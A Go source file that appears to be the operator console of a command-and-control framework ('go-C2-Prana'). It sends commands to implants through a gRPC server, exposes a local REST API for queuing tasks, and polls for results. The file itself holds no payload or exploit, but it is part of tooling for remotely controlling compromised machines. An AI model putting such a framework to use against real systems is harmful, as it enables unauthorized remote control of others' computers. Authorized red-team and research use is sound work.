package main

import (
	"context"
	"fmt"
	"github.dev/nireitdev/go-C2-Prana/admin/api"
	"github.dev/nireitdev/go-C2-Prana/internal/Task"
	proto2 "github.dev/nireitdev/go-C2-Prana/internal/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
	"log"
	"log/slog"
	"math/rand"
	"os"
	"time"
)

var (
	SERVERIP    = "127.0.0.1"
	SERVERPORT  = "3000"
	APIRESTIP   = "127.0.0.1"
	APIRESTPORT = "8080"
)

func main() {

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	TaskList := Task.NewTaskList()
	chanTask := make(chan Task.Task)

	//Start GRPC coneccion
	opts := grpc.DialOption(grpc.WithTransportCredentials(insecure.NewCredentials()))
	addr := fmt.Sprintf("%s:%s", SERVERIP, SERVERPORT)
	slog.Info("Iniciando conexion Servidor...", "addr", addr)
	conn, err := grpc.NewClient(addr, opts)
	if err != nil {
		slog.Error("Imposible conectar con el servidor. Bye!")
		os.Exit(1)
	}
	defer conn.Close()
	srv := proto2.NewServerClient(conn)

	//Start Api REST
	go func() {
		addr := fmt.Sprintf("%s:%s", APIRESTIP, APIRESTPORT)
		slog.Info("Iniciando API..", "addr", addr)
		server := api.NewApiRest(addr, chanTask, TaskList)
		server.Run(context.Background())
	}()

	//Wait for new tasks and send to Server
	go func() {
		for task := range chanTask {
			TaskList.Tasks[task.TaskID] = task
			taskreq := proto2.Task{
				TaskID:    task.TaskID,
				ImplantID: task.ImplantID,
				Command:   task.Command,
			}

			taskresult, err := srv.AdminNewTask(context.Background(), &taskreq)
			if err != nil {
				slog.Error("Imposible conectarse con el Server. ")
				if status, ok := status.FromError(err); ok {
					slog.Error("RPC error: ", "MSG", status.Message())
				}
				continue
			}
			if taskresult.Status == proto2.TaskStatus_NEWTASKOK {
				log.Printf("Nuevo task agregado exitosamente. Task: %v \n", taskresult)
			}
		}
	}()

	//Receive from server the results
	go func() {
		for {
			for _, task := range TaskList.Tasks {
				if task.StatusRun == Task.WAITINGTORUN {
					taskresult, err := srv.AdminGetTask(context.Background(), &proto2.TaskId{TaskId: task.TaskID})
					if err != nil {
						slog.Error("Imposible conectarse con el Server. ")
						if status, ok := status.FromError(err); ok {
							slog.Error("RPC error: ", "MSG", status.Message())
						}
						continue
					}
					task.Result = taskresult.Result
					task.StatusRun = Task.RUNNEDOK //FIXME: pierdo el estado de "OK" o "FAIL" de la ejecucion original en el Implant
					TaskList.Tasks[task.TaskID] = task
				}
			}
			time.Sleep(time.Duration(rand.Intn(60)) * time.Second) //para evitar DDOS del servidor
		}

	}()

	go TaskList.PrintTaskListInfo()

	//FIXME: ctr+c, Sigterm, Sigkill etc:
	exit := make(chan bool)
	<-exit
}
